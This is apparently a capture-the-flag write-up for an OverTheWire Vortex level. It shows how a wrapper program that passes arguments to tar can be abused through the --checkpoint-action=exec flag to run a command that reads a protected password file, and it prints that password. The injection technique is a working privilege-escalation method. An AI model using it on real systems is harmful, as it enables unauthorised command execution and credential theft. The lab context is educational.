## Vortex Level 2 → Level 3
### Tar Exploit

Problem page: <http://overthewire.org/wargames/vortex/vortex2.html>

Okay so this one is pretty straightforward, let's look at the code we need to exploit

```C
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
  char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
  execv(args[0], args);
}
```

This program just excetutes `tar cf /tmp/ownership.$$.tar` with whatever 3 additional command line arguments you pass into it, somebody could easily write a program like this with the intent that they would pass filenames as arguments, but we can just as easily pass in flags as arguments and drastically change the behaviour of the program.

Let's go through the [`tar` man page](https://linux.die.net/man/1/tar) to see what we have to work with.


```
--checkpoint[=NUMBER]
    display progress messages every NUMBERth record (default 10)

--checkpoint-action=ACTION
    execute ACTION on each checkpoint
```

Alright, so we can execute arbitrary commands every file by using these two flags, let's try it out. We'll make the first argument `/vortex/vortex2`, that way `tar` will have something to try to archive and run the checkpoint action on.

```console
vortex2@vortex:~$ /vortex/vortex2 /vortex/vortex2 "--checkpoint=1" "--checkpoint-action=exec=cat /etc/vortex_pass/vortex3"
/bin/tar: Removing leading `/' from member names
/bin/tar: UW1\377VS\350\305\376\377\377\201\303u\033: Cannot stat: No such file or directory
64ncXTvx#
/bin/tar: Exiting with failure status due to previous errors
```

Welp, `tar` didn't manage to make the archive, but it did print out the password, which was the more important output for us. Onto level 3!